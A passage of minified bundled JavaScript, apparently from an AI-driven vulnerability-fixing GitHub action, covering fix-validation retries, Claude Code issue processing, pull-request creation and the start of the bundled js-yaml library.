passes (GREEN)"),Q1=!0;else if(D1.error?.includes("infrastructure"))V.error(`[MITIGATE] Infrastructure failure: ${D1.error}`),V.warn("[MITIGATE] Skipping retries  test runner not available"),Q1=!1,M=L;else V.warn("[MITIGATE] Fix verification failed: RED test still fails"),Q1=!1}else if($?.generatedTests?.success&&$.generatedTests.testSuite)if(V.info("Validating fix with pre-generated executable tests (legacy path)..."),V1=await new FQ().validateFixWithTests(W,kX(Z)?Z.commitHash:"HEAD",$.generatedTests.testSuite),V1.isValidFix)V.info(" Fix validated successfully with tests"),Q1=!0;else V.warn(" Runtime test validation failed"),Q1=!1;else V.warn(" No validation available, proceeding without validation"),Q1=!0;if(Q1)break;if(M++,M>=L){if(process.env.RSOLV_TESTING_MODE==="true"){V.warn(`[TEST MODE] Fix validation failed after ${L} attempts, but creating PR anyway for inspection`);let t=Q1===!1&&e==="XSS"&&d.includes("config/")?"Static analysis shows vulnerable patterns still present (document.write with location.host)":"Fix validation failed - tests did not pass";if(V.info("[TEST MODE] Keeping attempted fix for PR creation"),Z)Z.isTestMode=!0,Z.validationFailed=!0,Z.testModeNote=`Validation failed: ${t}`;break}V.warn(`Fix validation failed after ${L} attempts, rolling back`),o8(`git reset --hard ${W}`,{encoding:"utf-8"});let n=Q1===!1&&e==="XSS"&&d.includes("config/")?"Static analysis shows vulnerable patterns still present (document.write with location.host)":"Fix validation failed - tests did not pass";return{issueId:X.id,success:!1,message:`Fix validation failed after ${L} attempts`,error:n}}if(V.info(`Fix iteration ${M}: Previous fix failed validation`),o8(`git reset --hard ${W}`,{encoding:"utf-8"}),V1)if(z&&"fixedResult"in V1&&!V1.isValidFix){let D1=V1;R={...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Fix Verification Failed (attempt ${M} of ${L})

The RED test still fails after your fix. Test output:
\`\`\`
${D1.fixedResult?.output||"no output"}
\`\`\`

The test expects the vulnerability to be fixed. Please review and try again.`}}else if(V1.vulnerablePatterns)R={...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Previous Fix Attempt Failed (Static Analysis)

Your fix did not remove the vulnerable patterns:
- Still present: ${V1.vulnerablePatterns.join(", ")}

### Required Fix:
For config/env/development.js XSS, you MUST:
1. Remove document.write with location.host concatenation
2. Use createElement('script') and appendChild instead
3. Or hardcode localhost:35729 without using location.host

### Example Safe Fix:
\`\`\`javascript
environmentalScripts: [
  \`<script>
    (function() {
      var script = document.createElement('script');
      script.src = 'http://localhost:35729/livereload.js';
      document.body.appendChild(script);
    })();
  </script>\`
]
\`\`\`

This is attempt ${M+1} of ${L}.`};else R=G10(X,V1,$,M,L);else R=X;continue}break}let j=kX(Z)?Z.commitHash:void 0;V.info(`Creating PR from commit ${j?.substring(0,8)||"HEAD"}`);let F=process.env.RSOLV_EDUCATIONAL_PR!=="false",A=Z?.isTestMode?{isTestMode:Z.isTestMode,validationFailed:Z.validationFailed,testModeNote:Z.testModeNote}:{},O=F&&kX(Z)?await VJ(X,Z.commitHash,{...Z.summary,vulnerabilityType:H.vulnerabilityType||"security",severity:H.severity||"medium",cwe:H.cwe,isAiGenerated:H.isAiGenerated,...A},Q,Z.diffStats,J):kX(Z)?await JG(X,Z.commitHash,{...Z.summary,...A},Q,Z.diffStats):null;if(!O||!O.success){try{o8("git reset --hard HEAD~1",{encoding:"utf-8"}),V.info("Rolled back commit after PR creation failure")}catch(N){V.warn("Failed to rollback commit",N)}return{issueId:X.id,success:!1,message:O?.message||"Failed to create PR",error:O?.error||"Unknown error"}}let w=Date.now()-Y;return V.info(`Successfully processed issue #${X.number} in ${w}ms`),{issueId:X.id,success:!0,message:`Created PR #${O.pullRequestNumber}`,pullRequestUrl:O.pullRequestUrl,pullRequestNumber:O.pullRequestNumber,filesModified:kX(Z)?Z.filesModified:void 0,diffStats:kX(Z)?Z.diffStats:void 0}}catch(G){V.error(`Error processing issue #${X.number}`,G);try{o8(`git reset --hard ${W}`,{encoding:"utf-8"})}catch(H){V.warn("Failed to rollback after error",H)}return{issueId:X.id,success:!1,message:"Error processing issue",error:G instanceof Error?G.message:String(G)}}}function QS(){try{let X=o8("git status --porcelain",{encoding:"utf-8"}).trim();if(!X)return{clean:!0,modifiedFiles:[]};let Q=X.split(`
`).map((J)=>J.substring(2).trim()).filter((J)=>J.length>0).filter((J)=>!J.startsWith(".rsolv/"));if(Q.length===0)return{clean:!0,modifiedFiles:[]};return{clean:!1,modifiedFiles:Q}}catch(X){return V.error("Failed to check git status",X),{clean:!1,modifiedFiles:["unknown"]}}}function z10(){try{if(o8("git status --porcelain",{encoding:"utf-8"}).trim())V.info("Cleaning up uncommitted changes and untracked files"),o8("git reset --hard HEAD",{encoding:"utf-8"}),o8("git clean -fd",{encoding:"utf-8"}),V.info("Git state cleaned")}catch(X){V.error("Failed to clean git state",X)}}var YS=$1(()=>{y1();w5();zJ();oP();XV();eK();xU();gU();YV()});var GS={};Y9(GS,{processIssues:()=>U10,processIssueWithEnhancedContext:()=>WS});async function U10(X,Q,J={},Y){V.info(`Processing ${X.length} issues with AI`);let W=[];for(let G of X)try{V.info(`Processing issue #${G.number}: ${G.title}`);let H=await WS(G,Q,J,Y);if(W.push(H),H.success)V.info(`Successfully processed issue #${G.number}. PR: ${H.pullRequestUrl}`);else V.warn(`Failed to process issue #${G.number}: ${H.message}`)}catch(H){V.error(`Error processing issue #${G.number}`,H),W.push({issueId:G.id,success:!1,message:z6(`Error processing issue: ${H instanceof Error?H.message:String(H)}`),error:z6(String(H))})}return W}async function WS(X,Q,J={},Y){let W=Date.now();try{if(Q.useGitBasedEditing){V.info(`Using git-based in-place editing for issue #${X.number}`);try{let B=lP(X);if(B)V.info(`[UnifiedProcessor] Using validation data: ${pP(B)}`);let q=await JS(X,Q,B);return{issueId:X.id,success:q.success,message:q.message,pullRequestUrl:q.pullRequestUrl,error:q.error,enhancedSolution:!0}}catch(B){V.error("Git-based processing failed, falling back to standard processing",B)}}V.info(`Analyzing issue #${X.number}`);let G,H;if(J.enableSecurityAnalysis&&Q.enableSecurityAnalysis!==!1){V.info(`Using security-aware analysis for issue #${X.number}`);let q=await new MQ().analyzeWithSecurity(X,Q);G=q,H=q.securityAnalysis}else G=await Q8(X,Q,Y?.aiClient);if(!G||!G.canBeFixed)return{issueId:X.id,success:!1,message:"Issue cannot be automatically fixed based on analysis"};V.info(`Generating solution for issue #${X.number}`),V.info("Config aiProvider:",JSON.stringify(Q.aiProvider));let $,z,U;if(!J.enableEnhancedContext&&Q.aiProvider.provider==="claude-code"){V.info("Using single-pass Claude Code adapter for optimized processing");let B={provider:Q.aiProvider.provider,apiKey:Q.aiProvider.providerApiKey,model:Q.aiProvider.model,temperature:Q.aiProvider.temperature,maxTokens:Q.aiProvider.maxTokens,useVendedCredentials:Q.aiProvider.useVendedCredentials,claudeCodeConfig:{...Q.claudeCodeConfig,enableDeepContext:!1,contextDepth:"shallow",timeout:420000,verboseLogging:J.verboseLogging||!1}},q;if(Q.aiProvider.useVendedCredentials&&Q.rsolvApiKey){process.env.RSOLV_API_KEY=Q.rsolvApiKey,V.info("Set RSOLV_API_KEY environment variable for vended credentials"),V.info("Getting credential manager singleton for vended credentials");let{CredentialManagerSingleton:j}=await Promise.resolve().then(() => (RX(),K7));q=await j.getInstance(Q.rsolvApiKey)}let Z=Date.now(),M=K8({repoPath:process.cwd(),credentialManager:q,useVendedCredentials:B.useVendedCredentials,maxTurns:5,model:B.model,testFilePatterns:["test/","tests/","spec/","__tests__/",".test.",".spec."],verbose:J.verboseLogging}),L={summary:`${G.issueType} issue requiring ${G.estimatedComplexity} fix`,complexity:G.estimatedComplexity==="simple"?"low":G.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[G.suggestedApproach],recommendedApproach:G.suggestedApproach,relatedFiles:G.filesToModify},R=await M.generateSolutionWithContext(X,L,void 0,H);return z=Date.now()-Z,V.info(`Single-pass processing completed in ${z}ms`),{issueId:X.id,success:R.success,message:R.message,error:R.error,contextGatheringTime:z,enhancedSolution:!0}}else if(J.enableEnhancedContext&&Q.aiProvider.provider==="claude-code"){let B={provider:Q.aiProvider.provider,apiKey:Q.aiProvider.providerApiKey,model:Q.aiProvider.model,temperature:Q.aiProvider.temperature,maxTokens:Q.aiProvider.maxTokens,useVendedCredentials:Q.aiProvider.useVendedCredentials,claudeCodeConfig:{...Q.claudeCodeConfig,enableDeepContext:!0,enableUltraThink:J.contextDepth==="ultra",contextDepth:J.contextDepth||"deep",contextGatheringTimeout:J.contextGatheringTimeout||600000,verboseLogging:J.verboseLogging||!1}},q;if(V.info(`Enhanced context setup - useVendedCredentials: ${Q.aiProvider.useVendedCredentials}, rsolvApiKey: ${Q.rsolvApiKey?"present":"missing"}`),Q.aiProvider.useVendedCredentials&&Q.rsolvApiKey){process.env.RSOLV_API_KEY=Q.rsolvApiKey,V.info("Set RSOLV_API_KEY environment variable for vended credentials"),V.info("Getting credential manager singleton for vended credentials");let{CredentialManagerSingleton:L}=await Promise.resolve().then(() => (RX(),K7));q=await L.getInstance(Q.rsolvApiKey),V.info("Credential manager singleton retrieved successfully")}else V.info(`Skipping credential manager - useVended: ${Q.aiProvider.useVendedCredentials}, apiKey: ${Q.rsolvApiKey?"present":"missing"}`);let Z=Date.now();V.info(`Creating ClaudeAgentSDKAdapter with credentialManager: ${!!q}`),U=await K8({repoPath:process.cwd(),credentialManager:q,useVendedCredentials:B.useVendedCredentials,maxTurns:J.contextDepth==="ultra"?7:5,model:B.model,testFilePatterns:["test/","tests/","spec/","__tests__/",".test.",".spec."],verbose:J.verboseLogging}).gatherDeepContext(X,{contextDepth:J.contextDepth||"medium",maxExplorationTime:J.contextGatheringTimeout||600000,enableUltraThink:J.contextDepth==="ultra",includeArchitectureAnalysis:!0,includeTestPatterns:!0,includeStyleGuide:!0,includeDependencyAnalysis:!0}),z=Date.now()-Z,$=await NV(X,G,Q,Y?.aiClient,Y?.fileGetter,H)}else $=await NV(X,G,Q,Y?.aiClient,Y?.fileGetter,H);if(!$||!$.success||!$.changes||Object.keys($.changes).length===0)return{issueId:X.id,success:!1,message:$?.message||"No solution generated"};V.info(`Creating pull request for issue #${X.number}`);let K=await nP(X,$.changes,G,Q,H,$.explanations);return{issueId:X.id,success:K.success,pullRequestUrl:K.pullRequestUrl,message:K.message,analysisData:G,contextGatheringTime:z,deepContext:J.verboseLogging?U:void 0,enhancedSolution:J.enableEnhancedContext,securityAnalysis:H}}catch(G){return V.error(`Error processing issue #${X.number}`,G),{issueId:X.id,success:!1,message:z6(`Error processing issue: ${G instanceof Error?G.message:String(G)}`),error:z6(String(G))}}}var HS=$1(()=>{y1();dP();w5();SU();rP();aP();zJ();YS()});var zS={};Y9(zS,{runTests:()=>$S,default:()=>K10});async function $S(X){return{passed:!0,failed:0,total:X.length||0,details:X.map((Q)=>({name:Q.name||"test",passed:!0}))}}var K10;var US=$1(()=>{K10=$S});import{execSync as W4}from"child_process";function KS(){try{return W4("git rev-parse --abbrev-ref HEAD",{encoding:"utf-8",stdio:"pipe"}).trim()}catch{return null}}function VS(X,Q){try{W4(`git checkout -b ${X} ${Q}`,{encoding:"utf-8",stdio:"pipe"})}catch{W4(`git checkout ${X}`,{encoding:"utf-8",stdio:"pipe"}),W4(`git reset --hard ${Q}`,{encoding:"utf-8",stdio:"pipe"})}}function BS(X,Q=!1){W4(`git push ${Q?"-f ":""}origin ${X}`,{encoding:"utf-8",stdio:"pipe"})}function EV(X,Q){if(Q===X)return!0;try{return W4(`git checkout ${X}`,{encoding:"utf-8",stdio:"pipe"}),!0}catch{return!1}}var qS=()=>{};var MS={};Y9(MS,{default:()=>V10,createPullRequest:()=>ZS});async function ZS(X){if(!process.env.GITHUB_TOKEN)throw Error("PR creation failed: GITHUB_TOKEN environment variable is not set");let Q=new TJ({auth:process.env.GITHUB_TOKEN});try{let[J,Y]=X.repository.split("/"),W=`rsolv/fix/issue-${X.issueNumber}`;console.log(`[PR] Creating and pushing branch ${W} from commit ${X.commitSha.substring(0,8)}`);let G=KS();if(!G)console.log("[PR] Warning: Could not determine current branch, will not return to original branch");try{if(VS(W,X.commitSha),BS(W,!0),G&&G!==W)EV(G,W);console.log(`[PR] Successfully pushed branch ${W}`)}catch($){if(G&&G!==W)EV(G,W);let z=$ instanceof Error?$.message:String($);throw console.error(`[PR] Failed to push branch: ${z}`),Error(`Failed to push commit to remote: ${z}`)}console.log("[PR] Creating pull request");let H;try{H=await Q.rest.pulls.create({owner:J,repo:Y,title:X.title,body:X.body,head:W,base:X.base})}catch($){if($.status===422&&$.message?.includes("pull request already exists")){console.log("[PR] Pull request already exists, fetching existing PR");let{data:z}=await Q.rest.pulls.list({owner:J,repo:Y,head:`${J}:${W}`,state:"open"});if(z.length>0)H={data:z[0]},console.log(`[PR] Using existing PR #${H.data.number}`);else throw Error("Pull request already exists but could not be found")}else throw $}return console.log(`[PR] Applying rsolv:mitigated label to issue #${X.issueNumber}`),await Q.rest.issues.addLabels({owner:J,repo:Y,issue_number:X.issueNumber,labels:["rsolv:mitigated"]}),console.log(`[PR] Created PR #${H.data.number}: ${H.data.html_url}`),{number:H.data.number,url:H.data.html_url,title:H.data.title}}catch(J){throw console.error("[PR] Failed to create pull request:",J),Error(`PR creation failed: ${J instanceof Error?J.message:String(J)}`)}}var V10;var jS=$1(()=>{YH();qS();V10={createPullRequest:ZS}});import*as SJ from"fs";/*! js-yaml 4.1.0 https://github.com/nodeca/js-yaml @license MIT */function tV(X){return typeof X>"u"||X===null}function CS(X){return typeof X==="object"&&X!==null}function PS(X){if(Array.isArray(X))return X;else if(tV(X))return[];return[X]}function SS(X,Q){var J,Y,W,G;if(Q){G=Object.keys(Q);for(J=0,Y=G.length;J<Y;J+=1)W=G[J],X[W]=Q[W]}return X}function ES(X,Q){var J="",Y;for(Y=0;Y<Q;Y+=1)J+=X;return J}function TS(X){return X===0&&Number.NEGATIVE_INFINITY===1/X}var _S=tV,kS=CS,bS=PS,vS=ES,xS=TS,fS=SS,W9={isNothing:_S,isObject:kS,toArray:bS,repeat:vS,isNegativeZero:xS,extend:fS};function eV(X,Q){var J="",Y=X.reason||"(unknown reason)";if(!X.mark)return Y;if(X.mark.name)J+='in "'+X.mark.name+'" ';if(J+="("+(X.mark.line+1)+":"+(X.mark.column+1)+")",!Q&&X.mark.snippet)J+=`

`+X.mark.snippet;return Y+" "+J}function H4(X,Q){if(Error.call(this),this.name="YAMLException",this.reason=X,this.mark=Q,this.message=eV(this,!1),Error.captureStackTrace)Error.captureStackTrace(this,this.constructor);else this.stack=Error().stack||""}H4.prototype=Object.create(Error.prototype);H4.prototype.constructor=H4;H4.prototype.toString=function(Q){return this.name+": "+eV(this,Q)};var f9=H4;function DG(X,Q,J,Y,W){var G="",H="",$=Math.floor(W/2)-1;if(Y-Q>$)G=" ... ",Q=Y-$+G.length;if(J-Y>$)H=" ...",J=Y+$-H.length;return{str:G+X.slice(Q,J).replace(/\t/g,"")+H,pos:Y-Q+G.length}}function NG(X,Q){return W9.repeat(" ",Q-X.length)+X}function hS(X,Q){if(Q=Object.create(Q||null),!X.buffer)return null;if(!Q.maxLength)Q.maxLength=79;if(typeof Q.indent!=="number")Q.indent=1;if(typeof Q.linesBefore!=="number")Q.linesBefore=3;if(typeof Q.linesAfter!=="number")Q.linesAfter=2;var J=/\r?\n|\r|\0/g,Y=[0],W=[],G,H=-1;while(G=J.exec(X.buffer))if(W.push(G.index),Y.push(G.index+G[0].length),X.position<=G.index&&H<0)H=Y.length-2;if(H<0)H=Y.length-1;var $="",z,U,K=Math.min(X.line+Q.linesAfter,W.length).toString().length,B=Q.maxLength-(Q.indent+K+3);for(z=1;z<=Q.linesBefore;z++){if(H-z<0)break;U=DG(X.buffer,Y[H-z],W[H-z],X.position-(Y[H]-Y[H-z]),B),$=W9.repeat(" ",Q.indent)+NG((X.line-z+1).toString(),K)+" | "+U.str+`
`+$}U=DG(X.buffer,Y[H],W[H],X.position,B),$+=W9.repeat(" ",Q.indent)+NG((X.line+1).toString(),K)+" | "+U.str+`
`,$+=W9.repeat("-",Q.indent+K+3+U.pos)+`^
`;for(z=1;z<=Q.linesAfter;z++){if(H+z>=W.length)break;U=DG(X.buffer,Y[H+z],W[H+z],X.position-(Y[H]-Y[H+z]),B),$+=W9.repeat(" ",Q.indent)+NG((X.line+z+1).toString(),K)+" | "+U.str+`
`}return $.replace(/\n$/,"")}var yS=hS,gS=["kind","multi","resolve","construct","instanceOf","predicate","represent","representName","defaultStyle","styleAliases"],mS=["scalar","sequence","mapping"];function uS(X){var Q={};if(X!==null)Object.keys(X).forEach(function(J){X[J].forEach(function(Y){Q[String(Y)]=J})});return Q}function cS(X,Q){if(Q=Q||{},Object.keys(Q).forEach(function(J){if(gS.indexOf(J)===-1)throw new f9('Unknown option "'+J+'" is met in definition of "'+X+'" YAML type.')}),this.options=Q,this.tag=X,this.kind=Q.kind||null,this.resolve=Q.resolve||function(){return!0},this.construct=Q.construct||function(J){return J},this.instanceOf=Q.instanceOf||null,this.predicate=Q.predicate||null,this.represent=Q.represent||null,this.representName=Q.representName||null,this.defaultStyle=Q.defaultStyle||null,this.multi=Q.multi||!1,this.styleAliases=uS(Q.styleAliases||null),mS.indexOf(this.kind)===-1)throw new f9('Unknown kind "'+this.kind+'" is specified for "'+X+'" YAML type.')}var j9=cS;function hV(X,Q){var J=[];return X[Q].forEach(function(Y){var W=J.length;J.forEach(function(G,H){if(G.tag===Y.tag&&G.kind===Y.kind&&G.multi===Y.multi)W=H}),J[W]=Y}),J}function lS(){var X={scalar:{},sequence:{},mapping:{},fallback:{},multi:{scalar:[],sequence:[],mapping:[],fallback:[]}},Q,J;function Y(W){if(W.multi)X.multi[W.kind].push(W),X.multi.fallback.push(W);else X[W.kind][W.tag]=X.fallback[W.tag]=W}for(Q=0,J=arguments.length;Q<J;Q+=1)arguments[Q].forEach(Y);return X}function IG(X){return this.extend(X)}IG.prototype.extend=function(Q){var J=[],Y=[];if(Q instanceof j9)Y.push(Q);else if(Array.isArray(Q))Y=Y.concat(Q);else if(Q&&(Array.isArray(Q.implicit)||Array.isArray(Q.explicit))){if(Q.implicit)J=J.concat(Q.implicit);if(Q.explicit)Y=Y.concat(Q.explicit)}else throw new f9("Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })");J.forEach(function(G){if(!(G instanceof j9))throw new f9("Specified list of YAML types (or a single Type object) contains a non-Type object.");if(G.loadKind&&G.loadKind!=="scalar")throw new f9("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.");if(G.multi)throw new f9("There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit.")}),Y.forEach(function(G){if(!(G instanceof j9))throw new f9("Specified list of YAML types (or a single Type object) contains a non-Type object.")});var W=Object.create(IG.prototype);return W.implicit=(this.implicit||[]).concat(J),W.explicit=(this.explicit||[]).concat(Y),W.compiledImplicit=hV(W,"implicit"),W.compiledExplicit=hV(W,"explicit"),W.compiledTypeMap=lS(W.compiledImplicit,W.compiledExplicit),W};var pS=IG,dS=new j9("tag:yaml.org,2002:str",{kind:"scalar",construct:function(X){return X!==null?X:""}}),iS=new j9("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(X){return X!==null?X:[]}}),rS=new j9("tag:yaml.org,2002:map",{kind:"mapping",construct:function(X){return X!==null?X:{}}}),nS=new pS({explicit:[dS,iS,rS]});function aS(X){if(X===null)return!0;var Q=X.length;return Q===1&&X==="~"||Q===4&&(X==="null"||X==="Null"||X==="NULL")}function oS(){return null}function sS(X){return X===null}var tS=new j9("tag:yaml.org,2002:null",{kind:"scalar",resolve:aS,construct:oS,predicate:sS,represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"},empty:function(){return""}},defaultStyle:"lowercase"});function eS(X){if(X===null)return!1;var Q=X.length;return Q===4&&(X==="true"||X==="True"||X==="TRUE")||Q===5&&(X==="false"||X==="False"||X==="FALSE")}function XE(X){return X==="true"||X==="True"||X==="TRUE"}function QE(X){return Object.prototype.toString.call(X)==="[object Boolean]"}var JE=new j9("tag:yaml.org,2002:bool",{kind:"scalar",resolve:eS,construct:XE,predicate:QE,represent:{lowercase:function(X){return X?"true":"false"},uppercase:function(X){return X?"TRUE":"FALSE"},camelcase:function(X){return X?"True":"False"}},defaultStyle:"lowercase"});function YE(X){return 48<=X&&X<=57||65<=X&&X<=70||97<=X&&X<=102}function WE(X){return 48<=X&&X<=55}function GE(X){return 48<=X&&X<=57}function HE(X){if(X===null)return!1;var Q=X.length,J=0,Y=!1,W;if(!Q)return!1;if(W=X[J],W==="-"||W==="+")W=X[++J];if(W==="0"){if(J+1===Q)return!0;if(W=X[++J],W==="b"){J++;for(;J<Q;J++){if(W=X[J],W==="_")continue;if(W!=="0"&&W!=="1")return!1;Y=!0}return Y&&W!=="_"}if(W==="x"){J++;for(;J<Q;J++){if(W=X[J],W==="_")continue;if(!YE(X.charCodeAt(J)))return!1;Y=!0}return Y&&W!=="_"}if(W==="o"){J++;for(;J<Q;J++){if(W=X[J],W==="_")continue;if(!WE(X.charCodeAt(J)))return!1;Y=!0}return Y&&W!=="_"}}if(W==="_")return!1;for(;J<Q;J++){if(W=X[J],W==="_")continue;if(!GE(X.charCodeAt(J)))return!1;Y=!0}if(!Y||W==="_")return!1;return!0}function $E(X){var Q=X,J=1,Y;if(Q.indexOf("_")!==-1)Q=Q.replace(/_/g,"");if(Y=Q[0],Y==="-"||Y==="+"){if(Y==="-")J=-1;Q=Q.slice(1),Y=Q[0]}if(Q==="0")return 0;if(Y==="0"){if(Q[1]==="b")return J*parseInt(Q.slice(2),2);if(Q[1]==="x")return J*parseInt(Q.slice(2),16);if(Q[1]==="o")return J*parseInt(Q.slice(2),8)}return J*parseInt(Q,10)}function zE(X){return Object.prototype.toString.call(X)==="[object Number]"&&(X%1===0&&!W9.isNegativeZero(X))}var UE=new j9("tag:yaml.org,2002:int",{kind:"scalar",resolve:HE,construct:$E,predicate:zE,represent:{binary:function(X){return X>=0?"0b"+X.toString(2):"-0b"+X.toString(2).slice(1)},octal:function(X){return X>=0?"0o"+X.toString(8):"-0o"+X.toString(8).slice(1)},decimal:function(X){return X.toString(10)},hexadecimal:function(X){return X>=0?"0x"+X.toString(16).toUpperCase():"-0x"+X.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),KE=new RegExp("^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");function VE(X){if(X===null)return!1;if(!KE.test(X)||X[X.length-1]==="_")return!1;return!0}function BE(X){var Q,J;if(Q=X.replace(/_/g,"").toLowerCase(),J=Q[0]==="-"?-1:1,"+-".indexOf(Q[0])>=0)Q=Q.slice(1);if(Q===".inf")return J===1?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY;else if(Q===".nan")return NaN;return J*parseFloat(Q,10)}var qE=/^[-+]?[0-9]+e/;function ZE(X,Q){var J;if(isNaN(X))switch(Q){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===X)switch(Q){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===X)switch(Q){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(W9.isNegativeZero(X))return"-0.0";return J=X.toString(10),qE.test(J)?J.replace("e",".e"):J}function ME(X){return Object.prototype.toString.call(X)==="[object Number]"&&(X%1!==0||W9.isNegativeZero(X))}var jE=new j9("tag:yaml.org,2002:float",{kind:"scalar",resolve:VE,construct:BE,predicate:ME,represent:ZE,defaultStyle:"lowercase"}),FE=nS.extend({implicit:[tS,JE,UE,jE]}),OE=FE,X2=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),Q2=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");function AE(X){if(X===null)return!1;if(X2.exec(X)!==null)return!0;if(Q2.exec(X)!==null)return!0;return!1}function RE(X){var Q,J,Y,W,G,H,$,z=0,U=null,K,B,q;if(Q=X2.exec(X),Q===null)Q=Q2.exec(X);if(Q===null)throw Error("Date resolve error");if(J=+Q[1],Y=+Q[2]-1,W=+Q[3],!Q[4])return new Date(Date.UTC(J,Y,W));if(G=+Q[4],H=+Q[5],$=+Q[6],Q[7]){z=Q[7].slice(0,3);while(z.length<3)z+="0";z=+z}if(Q[9]){if(K=+Q[10],B=+(Q[11]||0),U=(K*60+B)*60000,Q[9]==="-")U=-U}if(q=new Date(Date.UTC(J,Y,W,G,H,$,z)),U)q.setTime(q.getTime()-U);return q}function LE(X){return X.toISOString()}var DE=new j9("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:AE,construct:RE,instanceOf:Date,represent:LE});function NE(X){return X==="<<"||X===null}var wE=new j9("tag:yaml.org,2002:merge",{kind:"scalar",resolve:NE}),TG=`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
\r`;function IE(X){if(X===null)return!1;var Q,J,Y=0,W=X.length,G=TG;for(J=0;J<W;J++){if(Q=G.indexOf(X.charAt(J)),Q>64)continue;if(Q<0)return!1;Y+=6}return Y%8===0}function CE(X){var Q,J,Y=X.replace(/[\r\n=]/g,""),W=Y.length,G=TG,H=0,$=[];for(Q=0;Q<W;Q++){if(Q%4===0&&Q)$.push(H>>16&255),$.push(H>>8&255),$.push(H&255);H=H<<6|G.indexOf(Y.charAt(Q))}if(J=W%4*6,J===0)$.push(H>>16&255),$.push(H>>8&255),$.push(H&255);else if(J===18)$.push(H>>10&255),$.push(H>>2&255);else if(J===12)$.push(H>>4&255);return new Uint8Array($)}function PE(X){var Q="",J=0,Y,W,G=X.length,H=TG;for(Y=0;Y<G;Y++){if(Y%3===0&&Y)Q+=H[J>>18&63],Q+=H[J>>12&63],Q+=H[J>>6&63],Q+=H[J&63];J=(J<<8)+X[Y]}if(W=G%3,W===0)Q+=H[J>>18&63],Q+=H[J>>12&63],Q+=H[J>>6&63],Q+=H[J&63];else if(W===2)Q+=H[J>>10&63],Q+=H[J>>4&63],Q+=H[J<<2&63],Q+=H[64];else if(W===1)Q+=H[J>>2&63],Q+=H[J<<4&63],Q+=H[64],Q+=H[64];return Q}function SE(X){return Object.prototype.toString.call(X)==="[object Uint8Array]"}var EE=new j9("tag:yaml.org,2002:binary",{kind:"scalar",resolve:IE,construct:CE,predicate:SE,represent:PE}),TE=Object.prototype.hasOwnProperty,_E=Object.prototype.toString;function kE(X){if(X===null)return!0;var Q=[],J,Y,W,G,H,$=X;for(J=0,Y=$.length;J<Y;J+=1){if(W=$[J],H=!1,_E.call(W)!=="[object Object]")return!1;for(G in W)if(TE.call(W,G))if(!H)H=!0;else return!1;if(!H)return!1;if(Q.indexOf(G)===-1)Q.push(G);else return!1}return!0}function bE(X){return X!==null?X:[]}var vE=new j9("tag:yaml.org,2002:omap",{kind:"sequence",resolve:kE,construct:bE}),xE=Object.prototype.toString;function fE(X){if(X===null)return!0;var Q,J,Y,W,G,H=X;G=Array(H.length);for(Q=0,J=H.length;Q<J;Q+=1){if(Y=H[Q],xE.call(Y)!=="[object Object]")return!1;if(W=Object.keys(Y),W.length!==1)return!1;G[Q]=[W[0],Y[W[0]]]}return!0}function hE(X){if(X===null)return[];var Q,J,Y,W,G,H=X;G=Array(H.length);for(Q=0,J=H.length;Q<J;Q+=1)Y=H[Q],W=Object.keys(Y),G[Q]=[W[0],Y[W[0]]];return G}var yE=new j9("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:fE,construct:hE}),gE=Object.prototype.hasOwnProperty;function mE(X){if(X===null)return!0;var Q,J=X;for(Q in J)if(gE.call(J,Q)){if(J[Q]!==null)return!1}return!0}function uE(X){return X!==null?X:{}}var cE=new j9("tag:yaml.org,2002:set",{kind:"mapping",resolve:mE,construct:uE}),J2=OE.extend({implicit:[DE,wE],explicit:[EE,vE,yE,cE]}),e8=Object.prototype.hasOwnProperty,OJ=1,Y2=2,W2=3,AJ=4,wG=1,lE=2,yV=3,pE=/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,dE=/[\x85\u2028\u2029]/,iE=/[,\[\]\{\}]/,G2=/^(?:!|!!|![a-z\-]+!)$/i,H2=/^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;function gV(X){return Object.prototype.toString.call(X)}function l6(X){return X===10||X===13}function fX(X){return X===9||X===32}function h9(X){return X===9||X===32||X===10||X===13}function I7(X){return X===44||X===91||X===93||X===123||X===125}function rE(X){var Q;if(48<=X&&X<=57)return X-48;if(Q=X|32,97<=Q&&Q<=102)return Q-97+10;return-1}function nE(X){if(X===120)return 2;if(X===117)return 4;if(X===85)return 8;return 0}function aE(X){if(48<=X&&X<=57)return X-48;return-1}function mV(X){return 